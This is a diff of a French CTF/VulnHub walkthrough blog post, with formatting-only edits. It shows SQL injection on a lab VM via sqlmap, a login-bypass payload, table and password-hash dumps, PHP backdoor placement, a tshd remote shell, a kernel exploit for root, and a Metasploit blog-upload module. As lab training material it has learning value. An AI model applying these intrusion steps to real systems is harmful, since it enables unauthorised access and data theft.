@@ -46,17 +46,17 @@ Sur le port 80 il y a un site web minimaliste avec page de login et de création
 
 On lance *Wapiti* sur le site web en chargeant tous les modules habituels ainsi que plusieurs optionnels :  
 
-```bash
+```console
 $ ./bin/wapiti http://10.10.10.100/ -m "all,nikto,backup,htaccess"
 ```
 
 Plusieurs trouvailles :  
 
-* présence d'un phpinfo à l'adresse http://10.10.10.100/info.php
-* faille XSS dans register.php via différents paramètres
-* Faille SQL dans login.php via le champ email qui sert de username
+* présence d'un `phpinfo` à l'adresse http://10.10.10.100/info.php
+* faille XSS dans `register.php` via différents paramètres
+* Faille SQL dans `login.php` via le champ email qui sert de username
 
-A l'ouest rien de nouveau
+À l'ouest rien de nouveau
 -------------------------
 
 Quand on reproduit l'attaque SQl le script PHP nous renvoie des erreurs super-parlantes avec la requête SQL au complet :  
@@ -65,20 +65,20 @@ Quand on reproduit l'attaque SQl le script PHP nous renvoie des erreurs super-pa
 SELECT * FROM users WHERE email='"'' AND pass='4a8a9fc31dc15a4b87bb145b05db3ae0bf2333e4' AND active IS NULL
 ```
 
-On lance *SQLmap* qui voit la faille mais bloque quand on lui demande des actions particulières (comme *--current-user*) :  
+On lance *SQLmap* qui voit la faille, mais bloque quand on lui demande des actions particulières (comme *--current-user*) :  
 
 ```
 [21:48:19] [WARNING] the back-end DBMS is not MySQL
 [21:48:19] [CRITICAL] sqlmap was not able to fingerprint the back-end database management system.
 ```
 
-Etant donné que j'ai spécifié *--dbms=mysql* c'est visiblement un bug dans *sqlmap*. Une mise à jour plus tard ça fonctionne :  
+Etant donné que j'ai spécifié `--dbms=mysql` c'est visiblement un bug dans *sqlmap*. Une mise à jour plus tard ça fonctionne :  
 
 ```
 current user:    'root@localhost'
 ```
 
-Avec l'option *--schema* on obtient les différentes bases de données et la structure des tables :  
+Avec l'option `--schema` on obtient les différentes bases de données et la structure des tables :  
 
 ```
 Database: ch16
@@ -109,7 +109,7 @@ Les hashs des utilisateurs MySQL (tables users via l'utilisation de *--passwords
 
 Malheureusement aucun des hashs n'est tombé même avec une bonne wordlist. Il faut dire aussi que le MySQL est plus récent que sur d'autres CTF (comme [VulnImage]({% link _posts/2014-04-15-Solution-du-CTF-VulnImage-de-VulnHub.md %})) et l'algorithme de hashage utilisé est plus robuste.  
 
-On dumpe le contenu de la table *users* de la base *ch16* utilisé par l'application web (*-D ch16 -t users --dump*) :  
+On dumpe le contenu de la table *users* de la base *ch16* utilisé par l'application web (`-D ch16 -t users --dump`) :  
 
 ```
 +---------+------------------------------------------+------------------+--------+-----------+------------+------------+---------------------+
@@ -119,11 +119,11 @@ On dumpe le contenu de la table *users* de la base *ch16* utilisé par l'applica
 +---------+------------------------------------------+------------------+--------+-----------+------------+------------+---------------------+
 ```
 
-Le hash SHA-1 n'est pas retrouvable sur les sites comme *crackstation*. Le casser ne semble donc pas être une option. Il est toutefois possible de bypasser l'autentification en spécifiant *admin@isints.com'#* comme email dans le formulaire mais cela ne nous emmène pas plus loin (il n'y a pas de zone privée, l'appli n'est pas complète).  
+Le hash SHA-1 n'est pas retrouvable sur les sites comme *crackstation*. Le casser ne semble donc pas être une option. Il est toutefois possible de bypasser l'autentification en spécifiant `admin@isints.com'#` comme email dans le formulaire mais cela ne nous emmène pas plus loin (il n'y a pas de zone privée, l'appli n'est pas complète).  
 
-On appelle sqlmap avec l'option *--os-shell* et il parvient à créer une backdoor PHP dans */var/www/*. On remarque immédiatement que ces backdoors sont créées avec les droits root. Oui le mysql tourne en root !  
+On appelle sqlmap avec l'option `--os-shell` et il parvient à créer une backdoor PHP dans `/var/www/`. On remarque immédiatement que ces backdoors sont créées avec les droits root. Oui le mysql tourne en root !  
 
-Par conséquent il doit être possible de jouer directement avec *INTO OUTFILE* pour créer un fichier qui nous ouvrirait les portes comme une tâche dans *cron.hourly* (sauf que le fichier n'est pas exécutable, il faudrait donc se creuser les méninges pour trouver une astuce). Mais pour le moment je préfère placer un *tshd* pour disposer d'un vrai shell.  
+Par conséquent, il doit être possible de jouer directement avec `INTO OUTFILE` pour créer un fichier qui nous ouvrirait les portes comme une tâche dans `cron.hourly` (sauf que le fichier n'est pas exécutable, il faudrait donc se creuser les méninges pour trouver une astuce). Mais pour le moment je préfère placer un `tshd` pour disposer d'un vrai shell.  
 
 On est sur un kernel Linux 2.6 64bits :  
 
@@ -131,7 +131,7 @@ On est sur un kernel Linux 2.6 64bits :
 Linux web 2.6.38-8-server #42-Ubuntu SMP Mon Apr 11 03:49:04 UTC 2011 x86_64 x86_64 x86_64 GNU/Linux
 ```
 
-Contenu de /etc/passwd :  
+Contenu de `/etc/passwd` :  
 
 ```
 root:x:0:0:root:/root:/bin/bash
@@ -160,24 +160,24 @@ landscape:x:104:110::/var/lib/landscape:/bin/false
 dan:x:1000:1000:Dan Privett,,,:/home/dan:/bin/bash
 ```
 
-Dans */var/www* il y a un dossier *blog* qui correspond à un *Simple PHP Blog* troué... mais à ce stade on est déjà allé trop loin :p   
+Dans `/var/www` il y a un dossier *blog* qui correspond à un *Simple PHP Blog* troué... mais à ce stade, on est déjà allé trop loin :p   
 
-Le fichier *blog/config/password.txt* contient un hash que l'on ne prendra donc pas la peine de tenter de casser : $1$weWj5iAZ$NU4CkeZ9jNtcP/qrPC69a/.  
+Le fichier `blog/config/password.txt` contient un hash que l'on ne prendra donc pas la peine de tenter de casser : `$1$weWj5iAZ$NU4CkeZ9jNtcP/qrPC69a/`.  
 
 Root em all
 -----------
 
 Sur *exploit-db* on trouve [un exploit de sd](http://www.exploit-db.com/exploits/25444/) qui convient à l'architecture et au kernel.  
 
-Comme la VM est en host-only je préfère envoyer directement l'exploit sur le machine via *tsh* :  
+Comme la VM est en host-only je préfère envoyer directement l'exploit sur la machine via `tsh` :  
 
-```bash
+```console
 $ ./tsh 10.10.10.100 put perf.c /tmp/
 ```
 
 Côté VM :  
 
-```bash
+```console
 $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 $ mv /tmp/perf.c .
@@ -230,9 +230,9 @@ Ce fut court.
 Alternative mega-happy ending
 -----------------------------
 
-*Metasploit* dispose d'un module pour le *Simple PHP blog* que l'on aurait pu découvrir avec *dirb*.  
+*Metasploit* dispose d'un module pour le *Simple PHP blog* que l'on aurait pu découvrir avec `dirb`.  
 
-L'exploit ne fonctionne qu'à moitié dans notre cas puisqu'il parvient à changer le fichier *password.txt* et uploader un script PHP mais le payload ne semble pas aller plus loin (pas de session créée) :  
+L'exploit ne fonctionne qu'à moitié dans notre cas puisqu'il parvient à changer le fichier `password.txt` et uploader un script PHP, mais le payload ne semble pas aller plus loin (pas de session créée) :  
 
 ```
 msf exploit(sphpblog_file_upload) > exploit
@@ -251,7 +251,7 @@ msf exploit(sphpblog_file_upload) > exploit
 [*] Successfully removed /images/hHzAQ3dy4VqqB2WuCJHm.php
 ```
 
-Il suffit de reprendre les identifiants nouvellement créés, de se connecter et d'uploader nous même une backdoor PHP dans le dossier *images*.  
+Il suffit de reprendre les identifiants nouvellement créés, de se connecter et d'uploader nous même une backdoor PHP dans le dossier `images`.  
 
 Pour l'accès root on procédera de la même façon que précédemment.  
 
